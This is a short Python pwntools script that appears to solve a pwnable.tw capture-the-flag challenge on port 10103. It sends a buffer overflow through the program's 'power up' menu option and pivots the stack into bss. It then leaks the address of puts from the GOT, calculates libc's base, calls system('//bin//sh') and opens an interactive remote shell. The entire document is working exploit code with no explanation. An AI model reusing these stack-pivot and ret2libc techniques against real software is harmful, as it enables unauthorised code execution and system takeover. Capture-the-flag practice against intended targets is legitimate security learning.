from pwn import *
from time import sleep

context.arch = 'i386'

host = 'chall.pwnable.tw'
port = 10103
r = remote(host, port)

def create(desc):
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(desc)

def power_up(desc):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.send(desc)

def beat():
    r.recvuntil(':')
    r.sendline('3')

puts_got   = 0x0804afdc
bss        = 0x0804c000 - 0x250
call_puts  = 0x080487ec
read_input = 0x080485eb
leave_ret  = 0x08048558

create('a'*0x2f)
power_up('b'*0x1)
payload = p32(0xffffffff)[:3]
payload += flat([bss, read_input, leave_ret, bss, 0x11111111])
power_up(payload)
sleep(0.2)
beat()

payload = flat([bss+0x0c, call_puts, puts_got, bss+0x100-0x4,
                read_input, leave_ret, bss+0x100, 0x11111111])
r.send(payload)
r.recvuntil('You win !!\n')
puts = u32(r.recvuntil('\n')[:-1])
print('puts =', hex(puts))

libc   = puts - 0x0005f140
system = libc + 0x0003a940

payload = flat([system, 0xdeadbeef, bss+0x10c])
payload += b'//bin//sh'
sleep(0.2)
r.send(payload)

r.interactive()
